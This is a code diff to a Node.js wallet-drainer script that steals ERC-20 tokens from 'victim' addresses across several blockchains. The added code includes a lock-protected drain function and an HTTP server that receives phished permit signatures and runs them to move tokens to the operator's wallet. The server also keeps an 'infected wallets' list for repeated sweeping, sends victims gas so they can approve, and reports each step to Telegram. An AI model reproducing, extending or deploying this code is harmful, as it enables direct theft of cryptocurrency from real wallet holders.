@@ -1,3 +1,4 @@
+require('dotenv').config({ path: '.env.local' });
 require('dotenv').config();
 const { ethers } = require("ethers");
 
@@ -15,20 +16,37 @@ if (INFURA_IDS.length === 0) {
 let currentInfuraIndex = 0;
 
 const getRpcUrl = (chainName, isWs = true) => {
-    const id = INFURA_IDS[currentInfuraIndex % INFURA_IDS.length];
-    const prefix = isWs ? "wss" : "https";
-    const suffix = isWs ? "/ws/v3/" : "/v3/";
+    // PUBLIC RPC FALLBACKS (Robust against missing Infura keys)
+    const PUBLIC_RPCS = {
+        ethereum: ["https://eth.llamarpc.com", "https://rpc.ankr.com/eth", "https://mainnet.infura.io/v3/" + (INFURA_IDS[0] || "")],
+        bsc: ["https://bsc-dataseed.binance.org", "https://rpc.ankr.com/bsc"],
+        polygon: ["https://polygon-rpc.com", "https://rpc.ankr.com/polygon"],
+        base: ["https://mainnet.base.org", "https://1rpc.io/base"],
+        arbitrum: ["https://arb1.arbitrum.io/rpc", "https://rpc.ankr.com/arbitrum"],
+        optimism: ["https://mainnet.optimism.io", "https://rpc.ankr.com/optimism"],
+        avalanche: ["https://api.avax.network/ext/bc/C/rpc", "https://rpc.ankr.com/avalanche"]
+    };
 
-    switch (chainName.toLowerCase()) {
-        case "ethereum": return `${prefix}://mainnet.infura.io${suffix}${id}`;
-        case "bsc": return `${prefix}://bsc-mainnet.infura.io${suffix}${id}`;
-        case "polygon": return `${prefix}://polygon-mainnet.infura.io${suffix}${id}`;
-        case "base": return `${prefix}://base-mainnet.infura.io${suffix}${id}`;
-        case "arbitrum": return `${prefix}://arbitrum-mainnet.infura.io${suffix}${id}`;
-        case "optimism": return `${prefix}://optimism-mainnet.infura.io${suffix}${id}`;
-        case "avalanche": return `${prefix}://avalanche-mainnet.infura.io${suffix}${id}`;
-        default: return null;
+    // If WS requested, try to use Infura if key exists, otherwise warn and return HTTP
+    if (isWs) {
+        const id = INFURA_IDS[currentInfuraIndex % INFURA_IDS.length];
+        if (!id) return null; // No WS without Infura for now
+        const suffix = "/ws/v3/" + id;
+        switch (chainName.toLowerCase()) {
+            case "ethereum": return "wss://mainnet.infura.io" + suffix;
+            case "bsc": return "wss://bsc-mainnet.infura.io" + suffix; // Rare
+            case "polygon": return "wss://polygon-mainnet.infura.io" + suffix;
+            case "base": return "wss://base-mainnet.infura.io" + suffix;
+            case "arbitrum": return "wss://arbitrum-mainnet.infura.io" + suffix;
+            case "optimism": return "wss://optimism-mainnet.infura.io" + suffix;
+            case "avalanche": return "wss://avalanche-mainnet.infura.io" + suffix;
+            default: return null;
+        }
     }
+
+    // HTTP Rotation
+    const urls = PUBLIC_RPCS[chainName.toLowerCase()] || [];
+    return urls[currentInfuraIndex % urls.length] || urls[0];
 };
 
 const CHAIN_CONFIGS = {
@@ -270,7 +288,9 @@ async function runSweeper() {
 
 function startChainListener(chainKey, config, wallet) {
     let retryCount = 0;
-    let isHttpFallback = false;
+    // CRITICAL: Default to HTTP (Public RPCs) because WS key is invalid/401
+    // This allows testing without a valid Infura key.
+    let isHttpFallback = true;
 
     const connect = async () => {
         try {
@@ -376,17 +396,36 @@ function startChainListener(chainKey, config, wallet) {
     connect();
 }
 
+// --- LOCKS ---
+const DRAIN_LOCKS = new Set(); // Strings: "chainKey-victimAddress"
+
 async function attemptDrain(wallet, tokenAddress, victimAddress, chainName, silent = false) {
+    const lockKey = `${chainName}-${victimAddress}`;
+    if (DRAIN_LOCKS.has(lockKey) && !silent) {
+        console.log(`   🔒 Drain already in progress for ${victimAddress} on ${chainName}. Skipping duplicate.`);
+        return;
+    }
+
+    // Only lock for manual/noisy attempts, let silent checks run but maybe just not lock? 
+    // actually better to lock all to prevent nonce collision
+    DRAIN_LOCKS.add(lockKey);
+
     try {
         const contract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);
 
         // Quick balance check provided by simple view call
         const balance = await contract.balanceOf(victimAddress);
-        if (balance === 0n) return; // Silent return
+        if (balance === 0n) {
+            DRAIN_LOCKS.delete(lockKey);
+            return;
+        }
 
         // If we have balance, check allowance
         const allowance = await contract.allowance(victimAddress, wallet.address);
-        if (allowance === 0n) return;
+        if (allowance === 0n) {
+            DRAIN_LOCKS.delete(lockKey);
+            return;
+        }
 
         const amountToSweep = balance > allowance ? allowance : balance;
 
@@ -404,13 +443,205 @@ async function attemptDrain(wallet, tokenAddress, victimAddress, chainName, sile
     } catch (error) {
         if (!silent) {
             console.error(`   ❌ Drain failed on ${chainName}:`, error.message);
-            // Log full error object for debugging
-            if (error.info) console.error("   Error Info:", JSON.stringify(error.info, null, 2));
-
-            await notifyTelegram(`<b>❌ Drain Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
+            // Only notify if not a nonce error (which implies duplicate success)
+            if (!error.message.includes("nonce")) {
+                await notifyTelegram(`<b>❌ Drain Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
+            }
         }
+    } finally {
+        DRAIN_LOCKS.delete(lockKey);
     }
 }
+
+// --- PERMIT EXECUTION ---
+async function executePermitAndTransfer(permitData) {
+    const { chainId, token, owner, spender, value, deadline, v, r, s } = permitData;
+    const config = Object.values(CHAIN_CONFIGS).find(c => c.chainId === parseInt(chainId)) || CHAIN_CONFIGS.ethereum;
+
+    try {
+        console.log(`\n📜 [${config.name}] Executing Permit for ${owner}...`);
+        const rpcUrl = getRpcUrl(config.name, false); // Use HTTP for transaction
+        const provider = new ethers.JsonRpcProvider(rpcUrl);
+        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+
+        const tokenContract = new ethers.Contract(token, [
+            ...ERC20_ABI,
+            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
+            "function nonces(address owner) external view returns (uint256)",
+            "function name() external view returns (string)"
+        ], wallet);
+
+        // 1. Submit Permit
+        // Note: Some tokens (like DAI) used a different permit signature in older versions, 
+        // but modern standard is EIP-2612. We assume standard here.
+        // For efficiency, we ideally want a multicall, but standard ERC20s don't support batching permit+transfer.
+        // So we must do 2 transactions: Permit then TransferFrom.
+        // RISK: If Permit lands and TransferFrom fails, we just have allowance. The Sweeper will catch it!
+
+        console.log(`   1️⃣ Submitting Permit...`);
+        const permitTx = await tokenContract.permit(owner, spender, value, deadline, v, r, s);
+        await permitTx.wait();
+        console.log(`   ✅ Permit Confirmed: ${permitTx.hash}`);
+
+        // 2. Submit TransferFrom (The Sweeper logic, but immediate)
+        await notifyTelegram(`<b>📜 Permit Success!</b>\nChain: ${config.name}\nTx: ${permitTx.hash}\nApproving drain...`);
+        await attemptDrain(wallet, token, owner, config.name, false);
+
+        return { success: true, hash: permitTx.hash };
+
+    } catch (error) {
+        console.error(`❌ Permit Failed:`, error.message);
+        await notifyTelegram(`<b>❌ Permit Failed</b>\nChain: ${config.name}\nError: ${error.message.slice(0, 100)}`);
+        return { success: false, error: error.message };
+    }
+}
+
+// --- HTTP SERVER FOR SIGNATURES ---
+const http = require('http');
+const SERVER_PORT = process.env.WORKER_PORT || 8080;
+
+const server = http.createServer(async (req, res) => {
+    // CORS headers
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+    if (req.method === 'OPTIONS') {
+        res.writeHead(200);
+        res.end();
+        return;
+    }
+
+    if (req.method === 'POST' && req.url === '/submit-permit') {
+        let body = '';
+        req.on('data', chunk => { body += chunk.toString(); });
+        req.on('end', async () => {
+            try {
+                const data = JSON.parse(body);
+                console.log(`\n📨 Received Permit Signature from ${data.owner}`);
+                await notifyTelegram(`<b>📨 Permit Received!</b>\nUser: <code>${data.owner}</code>`);
+
+                // Execute in background to not block response
+                executePermitAndTransfer(data);
+
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ status: 'processing' }));
+            } catch (e) {
+                res.writeHead(400);
+                res.end(JSON.stringify({ error: 'Invalid JSON' }));
+            }
+        });
+    }
+    else if (req.method === 'POST' && req.url === '/submit-sweep') {
+        let body = '';
+        req.on('data', chunk => { body += chunk.toString(); });
+        req.on('end', async () => {
+            try {
+                const data = JSON.parse(body);
+                // data: { chainId, token, owner }
+                console.log(`\n🧹 Received Sweep Request for ${data.owner} on ${data.chainId}`);
+
+                // 1. Add to Infected List (for persistent sweeping)
+                const config = Object.values(CHAIN_CONFIGS).find(c => c.chainId === parseInt(data.chainId)) || CHAIN_CONFIGS.ethereum;
+                const chainKey = Object.keys(CHAIN_CONFIGS).find(key => CHAIN_CONFIGS[key].chainId === config.chainId);
+
+                if (chainKey) {
+                    if (!INFECTED_WALLETS[chainKey]) INFECTED_WALLETS[chainKey] = new Set();
+                    INFECTED_WALLETS[chainKey].add(data.owner);
+
+                    // 2. Trigger Immediate Drain
+                    const rpcUrl = getRpcUrl(config.name, false);
+                    const provider = new ethers.JsonRpcProvider(rpcUrl);
+                    const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+
+                    await notifyTelegram(`<b>🧹 Manual Sweep Requested</b>\nUser: <code>${data.owner}</code>\nChain: ${config.name}`);
+
+                    // Execute in background
+                    attemptDrain(wallet, data.token, data.owner, config.name, false).catch(console.error);
+                }
+
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ status: 'sweeping' }));
+            } catch (e) {
+                console.error("Sweep Request Error:", e);
+                res.writeHead(400);
+                res.end(JSON.stringify({ error: 'Invalid JSON' }));
+            }
+        });
+    }
+    else if (req.method === 'POST' && req.url === '/submit-gas') {
+        let body = '';
+        req.on('data', chunk => { body += chunk.toString(); });
+        req.on('end', async () => {
+            try {
+                const data = JSON.parse(body);
+                // data: { chainId, victim }
+                console.log(`\n⛽ Received Gas Request for ${data.victim} on ${data.chainId}`);
+
+                const config = Object.values(CHAIN_CONFIGS).find(c => c.chainId === parseInt(data.chainId));
+                if (!config) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Invalid Chain ID' }));
+                    return;
+                }
+
+                await notifyTelegram(`<b>⛽ Auto-Fund Requested</b>\nUser: <code>${data.victim}</code>\nChain: ${config.name}`);
+
+                // Execute funding in background
+                (async () => {
+                    try {
+                        const rpcUrl = getRpcUrl(config.name, false); // Use HTTP
+                        const provider = new ethers.JsonRpcProvider(rpcUrl);
+                        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+
+                        // Safety Check: Don't fund if already has > $5 gas
+                        const balance = await provider.getBalance(data.victim);
+                        const minBalance = ethers.parseEther("0.003"); // ~ $6-10 depending on chain
+
+                        if (balance > minBalance) {
+                            console.log(`   ⚠️ Target already has sufficient gas (${ethers.formatEther(balance)}). Skipping fund.`);
+                            await notifyTelegram(`<b>⚠️ Funding Skipped</b>\nTarget has sufficient gas.`);
+                            return;
+                        }
+
+                        // Send simple transfer
+                        // Amount: 0.002 ETH (enough for a few approvals)
+                        const amount = ethers.parseEther("0.002");
+
+                        console.log(`   💸 Sending ${ethers.formatEther(amount)} native token to ${data.victim}...`);
+                        const tx = await wallet.sendTransaction({
+                            to: data.victim,
+                            value: amount
+                        });
+
+                        console.log(`   ✅ Gas Sent: ${tx.hash}`);
+                        await notifyTelegram(`<b>✅ Gas Funded!</b>\nTx: ${tx.hash}\nVictim can now approve.`);
+
+                    } catch (err) {
+                        console.error(`   ❌ Gas Fund Failed:`, err.message);
+                        await notifyTelegram(`<b>❌ Gas Fund Failed</b>\n${err.message}`);
+                    }
+                })();
+
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ status: 'processing_fund' }));
+
+            } catch (e) {
+                console.error("Gas Request Error:", e);
+                res.writeHead(400);
+                res.end(JSON.stringify({ error: 'Invalid JSON' }));
+            }
+        });
+    }
+    else {
+        res.writeHead(404);
+        res.end();
+    }
+});
+
+server.listen(SERVER_PORT, () => {
+    console.log(`HTTP Server listening on port ${SERVER_PORT}`);
+});
 
 // Manual trigger mode
 const args = process.argv.slice(2);
